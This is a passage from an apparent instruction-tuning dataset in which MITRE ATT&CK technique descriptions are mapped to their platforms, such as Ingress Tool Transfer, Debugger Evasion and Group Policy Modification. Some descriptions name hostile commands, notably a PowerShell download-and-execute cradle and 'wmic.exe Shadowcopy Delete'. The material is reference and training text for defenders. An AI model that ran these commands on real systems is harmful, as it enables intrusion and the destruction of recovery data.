    "output": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "answer": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition.  Within MFT entries are file attributes,  such as Extended Attributes (EA) and Data known as Alternate Data Streams (ADSs) when more than one Data attribute is present, that can be used to store arbitrary data (and even complete files).    \n\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.",
    "context": "",
    "output": "The provided description is related to MITRE technique Hide Artifacts: NTFS File Attributes (T1564.004);\nTechnique Hide Artifacts: NTFS File Attributes (T1564.004) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition.  Within MFT entries are file attributes,  such as Extended Attributes (EA) and Data known as Alternate Data Streams (ADSs) when more than one Data attribute is present, that can be used to store arbitrary data (and even complete files).    \n\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.",
      "answer": "The provided description is related to MITRE technique Hide Artifacts: NTFS File Attributes (T1564.004);\nTechnique Hide Artifacts: NTFS File Attributes (T1564.004) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads (which may also involve Mark-of-the-Web Bypass to enable execution).?",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: Visual Basic (T1059.005);\nTechnique Command and Scripting Interpreter: Visual Basic (T1059.005) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads (which may also involve Mark-of-the-Web Bypass to enable execution).",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: Visual Basic (T1059.005);\nTechnique Command and Scripting Interpreter: Visual Basic (T1059.005) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct Phishing for Information or Phishing. Establishing email accounts may also allow adversaries to abuse free services \u2013 such as trial periods \u2013 to Acquire Infrastructure for follow-on purposes.\n\nAdversaries may also take steps to cultivate a persona around the email account, such as through use of Social Media Accounts, to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: Domains).\n\nTo decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Establish Accounts: Email Accounts (T1585.002);\nTechnique Establish Accounts: Email Accounts (T1585.002) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct Phishing for Information or Phishing. Establishing email accounts may also allow adversaries to abuse free services \u2013 such as trial periods \u2013 to Acquire Infrastructure for follow-on purposes.\n\nAdversaries may also take steps to cultivate a persona around the email account, such as through use of Social Media Accounts, to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: Domains).\n\nTo decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.",
      "answer": "The provided description is related to MITRE technique Establish Accounts: Email Accounts (T1585.002);\nTechnique Establish Accounts: Email Accounts (T1585.002) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.\n\nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\n\nOn network devices, adversaries may use crafted packets to enable Network Device Authentication for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage Patch System Image due to the monolithic nature of the architecture.\n\nAdversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.",
    "context": "",
    "output": "The provided description is related to MITRE technique Traffic Signaling (T1205);\nTechnique Traffic Signaling (T1205) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.\n\nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\n\nOn network devices, adversaries may use crafted packets to enable Network Device Authentication for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage Patch System Image due to the monolithic nature of the architecture.\n\nAdversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.",
      "answer": "The provided description is related to MITRE technique Traffic Signaling (T1205);\nTechnique Traffic Signaling (T1205) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping or <code>net view</code> using Net.\n\nAdversaries may also analyze data from local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local Arp cache entries) in order to discover the presence of remote systems in an environment.\n\nAdversaries may also target discovery of network infrastructure as well as leverage Network Device CLI commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).?",
    "context": "",
    "output": "The provided description is related to MITRE technique Remote System Discovery (T1018);\nTechnique Remote System Discovery (T1018) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping or <code>net view</code> using Net.\n\nAdversaries may also analyze data from local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local Arp cache entries) in order to discover the presence of remote systems in an environment.\n\nAdversaries may also target discovery of network infrastructure as well as leverage Network Device CLI commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).",
      "answer": "The provided description is related to MITRE technique Remote System Discovery (T1018);\nTechnique Remote System Discovery (T1018) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Encrypted Channel: Symmetric Cryptography (T1573.001);\nTechnique Encrypted Channel: Symmetric Cryptography (T1573.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
      "answer": "The provided description is related to MITRE technique Encrypted Channel: Symmetric Cryptography (T1573.001);\nTechnique Encrypted Channel: Symmetric Cryptography (T1573.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via Network Device CLI (e.g. <code>reload</code>).\n\nShutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.\n\nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as Disk Structure Wipe or Inhibit System Recovery, to hasten the intended effects on system availability.",
    "context": "",
    "output": "The provided description is related to MITRE technique System Shutdown/Reboot (T1529);\nTechnique System Shutdown/Reboot (T1529) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via Network Device CLI (e.g. <code>reload</code>).\n\nShutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.\n\nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as Disk Structure Wipe or Inhibit System Recovery, to hasten the intended effects on system availability.",
      "answer": "The provided description is related to MITRE technique System Shutdown/Reboot (T1529);\nTechnique System Shutdown/Reboot (T1529) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.\n\nDebugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to Virtualization/Sandbox Evasion, if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.\n\nSpecific checks will vary based on the target and/or adversary, but may involve Native API function calls such as <code>IsDebuggerPresent()</code> and <code> NtQueryInformationProcess()</code>, or manually checking the <code>BeingDebugged</code> flag of the Process Environment Block (PEB). Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would \u201cswallow\u201d or handle the potential error).\n\nAdversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping Native API function calls such as <code>OutputDebugStringW()</code>.",
    "context": "",
    "output": "The provided description is related to MITRE technique Debugger Evasion (T1622);\nTechnique Debugger Evasion (T1622) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.\n\nDebugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to Virtualization/Sandbox Evasion, if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.\n\nSpecific checks will vary based on the target and/or adversary, but may involve Native API function calls such as <code>IsDebuggerPresent()</code> and <code> NtQueryInformationProcess()</code>, or manually checking the <code>BeingDebugged</code> flag of the Process Environment Block (PEB). Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would \u201cswallow\u201d or handle the potential error).\n\nAdversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping Native API function calls such as <code>OutputDebugStringW()</code>.",
      "answer": "The provided description is related to MITRE technique Debugger Evasion (T1622);\nTechnique Debugger Evasion (T1622) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Screen Capture (T1113);\nTechnique Screen Capture (T1113) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.",
      "answer": "The provided description is related to MITRE technique Screen Capture (T1113);\nTechnique Screen Capture (T1113) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Encrypted Channel: Symmetric Cryptography (T1573.001);\nTechnique Encrypted Channel: Symmetric Cryptography (T1573.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
      "answer": "The provided description is related to MITRE technique Encrypted Channel: Symmetric Cryptography (T1573.001);\nTechnique Encrypted Channel: Symmetric Cryptography (T1573.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\n\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
    "context": "",
    "output": "The provided description is related to MITRE technique Virtualization/Sandbox Evasion (T1497);\nTechnique Virtualization/Sandbox Evasion (T1497) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\n\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
      "answer": "The provided description is related to MITRE technique Virtualization/Sandbox Evasion (T1497);\nTechnique Virtualization/Sandbox Evasion (T1497) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems. WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model and Windows Remote Management. Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS. \n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as Execution of commands and payloads. For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., Inhibit System Recovery).\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being \u201cdisabled by default\u201d on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by PowerShell as the primary WMI interface. In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Windows Management Instrumentation (T1047);\nTechnique Windows Management Instrumentation (T1047) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems. WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model and Windows Remote Management. Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS. \n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as Execution of commands and payloads. For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., Inhibit System Recovery).\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being \u201cdisabled by default\u201d on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by PowerShell as the primary WMI interface. In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.",
      "answer": "The provided description is related to MITRE technique Windows Management Instrumentation (T1047);\nTechnique Windows Management Instrumentation (T1047) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`. \n\nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.\n\nMalicious GPO modifications can be used to implement many other malicious behaviors such as Scheduled Task/Job, Disable or Modify Tools, Ingress Tool Transfer, Create Account, Service Execution,  and more. Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.\n\nFor example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious Scheduled Task/Job by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>. In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.",
    "context": "",
    "output": "The provided description is related to MITRE technique Domain or Tenant Policy Modification: Group Policy Modification (T1484.001);\nTechnique Domain or Tenant Policy Modification: Group Policy Modification (T1484.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`. \n\nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.\n\nMalicious GPO modifications can be used to implement many other malicious behaviors such as Scheduled Task/Job, Disable or Modify Tools, Ingress Tool Transfer, Create Account, Service Execution,  and more. Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.\n\nFor example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious Scheduled Task/Job by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>. In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows 